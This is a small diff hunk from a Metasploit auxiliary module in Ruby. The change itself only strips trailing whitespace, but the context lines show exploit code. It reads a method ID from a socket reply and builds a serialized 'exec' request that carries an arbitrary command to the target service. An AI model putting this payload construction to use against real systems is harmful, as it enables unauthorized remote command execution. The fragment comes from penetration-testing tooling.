@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 		sock.put(runtime)
 		res = sock.get_once()
 		methodid = res[5,4]
-		
+
 		exec =  [0x00].pack('n') + [21 + cmd.length].pack('n') + methodid
 		exec << [0x04000000].pack('V') + "exec" + [0x01000000].pack('V')
 		exec << "\x04" + [0x00].pack('n') + [cmd.length].pack('n') + cmd
